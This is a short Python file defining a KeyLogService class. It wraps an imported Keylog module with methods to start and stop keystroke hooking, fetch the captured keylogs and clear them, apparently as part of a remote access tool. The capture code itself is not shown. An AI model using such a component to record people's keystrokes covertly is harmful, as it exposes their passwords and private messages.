from keylog import Keylog

class KeyLogService:
    def __init__(self):
        self.keylogger = Keylog()
        
    def get_keylogs(self):
        return (self.keylogger.print().replace("\n", "\r") + "\n")
    
    def hook(self):
        self.keylogger.hook()
        
    def unhook(self):
        self.keylogger.unhook()
        
    def clear(self):
        self.keylogger.clear()
        return self.get_keylogs()